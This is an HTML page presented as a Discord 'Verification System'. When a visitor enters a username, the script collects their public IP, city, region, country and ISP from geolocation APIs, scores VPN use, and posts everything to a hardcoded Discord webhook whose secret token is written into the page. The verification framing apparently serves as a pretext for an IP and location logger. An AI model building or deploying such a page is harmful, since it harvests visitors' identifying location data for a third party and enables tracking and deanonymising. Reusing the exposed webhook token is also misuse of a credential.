<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification System</title>
  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Roboto', sans-serif; background-color: #f5f7fa; margin: 0; padding: 0;
      display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { background: #ffffff; border-radius: 12px; box-shadow: 0 6px 18px rgba(0,0,0,0.1);
      width: 90%; max-width: 600px; padding: 30px; text-align: center; }
    h1 { font-size: 2rem; margin-bottom: 20px; color: #333333; }
    #discord-prompt { margin-bottom: 20px; }
    #discord-prompt input { width: calc(100% - 140px); padding: 12px; border: 1px solid #ccc;
      border-radius: 6px; font-size: 1rem; }
    #discord-prompt button { padding: 12px 24px; margin-left: 10px; background-color: #7289da;
      color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; cursor: pointer; transition: background 0.3s ease; }
    #discord-prompt button:hover { background-color: #5b6eae; }
    .status, #ip-info { display: none; align-items: center; justify-content: center;
      padding: 20px; border-radius: 8px; font-size: 1rem; font-weight: 500;
      transition: background 0.3s, color 0.3s; margin-top: 20px; }
    .spinner { width: 30px; height: 30px; border: 4px solid rgba(0,0,0,0.1);
      border-left-color: #4a90e2; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 14px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading { background-color: #e1f0ff; color: #004085; border: 1px solid #b3d4fc; }
    .success { background-color: #e6f4ea; color: #155724; border: 1px solid #c3e6cb; }
    .error   { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    .warning { background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
    .message { text-align: left; }
    .message strong { display: block; margin-bottom: 6px; }
    .retry-btn { margin-top: 20px; background-color: #4a90e2; color: #ffffff; border: none;
      padding: 12px 24px; border-radius: 6px; font-size: 1rem; cursor: pointer; transition: background 0.3s ease; }
    .retry-btn:hover { background-color: #357ab8; }
    #ip-info { flex-direction: column; text-align: left; }
    #ip-info div { margin: 4px 0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîê Verification System</h1>
    <div id="discord-prompt">
      <input id="discord-input" type="text" placeholder="Enter Discord username#1234" />
      <button id="start-btn">Verify</button>
    </div>
    <div id="ip-info">
      <div><strong>IP Address:</strong> <span id="ip-field"></span></div>
      <div><strong>City, Region, Country:</strong> <span id="location-field"></span></div>
      <div><strong>ISP:</strong> <span id="isp-field"></span></div>
    </div>
    <div id="status" class="status loading">
      <div class="spinner"></div>
      <div class="message">
        <strong>Initializing...</strong>
        <span>Preparing verification process.</span>
      </div>
    </div>
    <button id="retry" class="retry-btn">üîÑ Retry</button>
  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
    const startBtn = document.getElementById('start-btn');
    const discordInput = document.getElementById('discord-input');
    const statusDiv = document.getElementById('status');
    const retryBtn = document.getElementById('retry');
    const ipInfo = document.getElementById('ip-info');
    const ipField = document.getElementById('ip-field');
    const locationField = document.getElementById('location-field');
    const ispField = document.getElementById('isp-field');

    retryBtn.style.display = 'none';

    startBtn.addEventListener('click', () => {
      const username = discordInput.value.trim();
      if (!/^.+#[0-9]{4}$/.test(username)) {
        alert('Enter valid Discord username (e.g., User#1234).');
        return;
      }
      discordInput.disabled = true;
      startBtn.disabled = true;
      beginVerification(username);
    });

    retryBtn.addEventListener('click', () => {
      retryBtn.style.display = 'none';
      beginVerification(discordInput.value.trim());
    });

    function setStatus(state, title, msg) {
      statusDiv.className = 'status ' + state;
      statusDiv.innerHTML = `
        $\{state==='loading'?'<div class="spinner"></div>':''}
        <div class="message">
          <strong>$\{title}</strong>
          <span>$\{msg}</span>
        </div>`;
      statusDiv.style.display = 'flex';
    }

    async function safeFetch(url, opts={}, timeout=5000) {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), timeout);
      try { const res = await fetch(url, {...opts, signal: ctrl.signal, mode:'cors'}); clearTimeout(timer); return res; }
      catch(e){ clearTimeout(timer); throw e; }
    }

    async function beginVerification(discordUser) {
      setStatus('loading', 'Verifying connection...', 'Fetching IP information...');
      try {
        // IP retrieval
        let ipData;
        try { ipData = await (await safeFetch('https://api.ipify.org?format=json')).json(); }
        catch { ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json(); }
        const ip = ipData.ip || ipData.ipAddress;
        if (!ip) throw new Error('IP not found');
        ipField.textContent = ip;

        // Geolocation
        setStatus('loading','Checking geolocation...','Contacting geo API');
        let geo;
        try { geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json(); if(geo.error) throw ''; }
        catch { geo = await (await safeFetch(`https://ipwho.is/${ip}`)).json(); }
        const city = geo.city||'Unknown'; const region=geo.region_name||geo.region||'Unknown'; const country=geo.country_name||geo.country||'Unknown';
        locationField.textContent = `${city}, ${region}, ${country}`;
        ispField.textContent = geo.org||geo.connection?.isp||'Unknown';
        ipInfo.style.display='block';

        // VPN scoring
        setStatus('loading','Analyzing network...','Evaluating VPN/proxy indicators');
        const factors=[]; let score=0;
        if(geo.org && /datacenter|hosting|cloud/i.test(geo.org)){ factors.push('Datacenter IP'); score+=40; }
        if(geo.org && /vpn|proxy|tor/i.test(geo.org)){ factors.push('VPN/Proxy'); score+=50; }
        if(geo.port && [1080,3128,8080,8888,9050].includes(+geo.port)){ factors.push('Proxy port'); score+=30; }
        if(geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)){ factors.push('Timezone mismatch'); score+=20; }
        const usingVpn=score>=60;

        // Webhook payload
        setStatus('loading','Finalizing...','Sending results to Discord');
        const embed={ username:'Verification System', avatar_url:'https://i.imgur.com/ZOKp8LH.png', embeds:[{ title:`${discordUser} ‚Äì ${city}, ${country}`, color:usingVpn?0xdc3545:0x28a745, fields:[ {name:'üîπ Discord User',value:discordUser,inline:false}, {name:'üîç Status',value:usingVpn?'‚ùå FAILED: VPN/Proxy':'‚úÖ PASSED: No VPN',inline:false}, {name:'üìç Location',value:`${city}, ${region}, ${country}`,inline:true}, {name:'üåê IP',value:ip,inline:true}, {name:'üè¢ ISP',value:geo.org||geo.connection?.isp||'Unknown',inline:true} ], footer:{ text: usingVpn?`VPN Score: ${score}`:`Verified: ${new Date().toISOString()}` } }] };
        if(factors.length) embed.embeds[0].fields.push({ name:'‚ö†Ô∏è Suspicious Factors', value:factors.join('\n'), inline:false });
        await fetch(DISCORD_WEBHOOK,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(embed) });

        setStatus(usingVpn?'warning':'success', usingVpn?'VPN/Proxy Detected':'Verification Successful', usingVpn?'Disable VPN/proxy and retry.':'Your connection is secure.');

      } catch(err) {
        console.error(err);
        setStatus('error','Error',''+err.message);
        retryBtn.style.display='block';
      }
    }
  </script>
</body>
</html>
